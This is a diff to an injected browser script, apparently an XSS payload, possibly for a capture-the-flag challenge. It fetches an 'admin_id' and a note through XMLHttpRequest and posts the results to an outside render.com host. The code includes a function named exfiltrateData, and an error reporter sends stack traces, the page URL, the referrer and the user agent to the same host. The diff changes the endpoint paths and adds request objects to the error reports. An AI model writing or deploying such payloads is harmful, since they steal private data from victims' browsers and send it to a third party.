@@ -8,14 +8,14 @@
 <script>
   function exfiltrateData(data) {
     var xhr = new XMLHttpRequest();
-    xhr.open("POST", "https://chocolate-7q8m.onrender.com/api/data", true);
+    xhr.open("POST", "https://chocolate-7q8m.onrender.com/chocolate", true);
     xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
     xhr.send("data=" + encodeURIComponent(data));
   }
 
   function reportError(errorDetails) {
     var xhr = new XMLHttpRequest();
-    xhr.open("POST", "https://chocolate-7q8m.onrender.com/api/error", true);
+    xhr.open("POST", "https://chocolate-7q8m.onrender.com/error", true);
     xhr.setRequestHeader("Content-Type", "application/json");
     xhr.send(JSON.stringify(errorDetails));
   }
@@ -30,7 +30,7 @@
       error: error ? error.stack : null,
       userAgent: navigator.userAgent,
       url: window.location.href,
-      referrer : document.referrer
+      referrer: document.referrer
     };
     reportError(errorDetails);
   };
@@ -62,7 +62,8 @@
                     responseURL: noteXhr.responseURL,
                     userAgent: navigator.userAgent,
                     url: window.location.href,
-                    referrer : document.referrer
+                    referrer: document.referrer,
+                    xhr: noteXhr
                   });
                 }
               }
@@ -72,7 +73,8 @@
                 message: "Request error fetching note",
                 userAgent: navigator.userAgent,
                 url: window.location.href,
-                referrer : document.referrer
+                referrer: document.referrer,
+                xhr: noteXhr
               });
             };
             noteXhr.send();
@@ -83,7 +85,8 @@
               stack: e.stack,
               userAgent: navigator.userAgent,
               url: window.location.href,
-              referrer : document.referrer
+              referrer: document.referrer,
+              xhr: xhr
             });
           }
         } else {
@@ -94,7 +97,8 @@
             responseURL: xhr.responseURL,
             userAgent: navigator.userAgent,
             url: window.location.href,
-            referrer : document.referrer
+            referrer: document.referrer,
+            xhr: xhr
           });
         }
       }
@@ -104,7 +108,8 @@
         message: "Request error fetching admin_id",
         userAgent: navigator.userAgent,
         url: window.location.href,
-        referrer : document.referrer
+        referrer: document.referrer,
+        xhr: xhr
       });
     };
     xhr.send();
@@ -115,7 +120,7 @@
       stack: e.stack,
       userAgent: navigator.userAgent,
       url: window.location.href,
-      referrer : document.referrer
+      referrer: document.referrer
     });
   }
 </script>
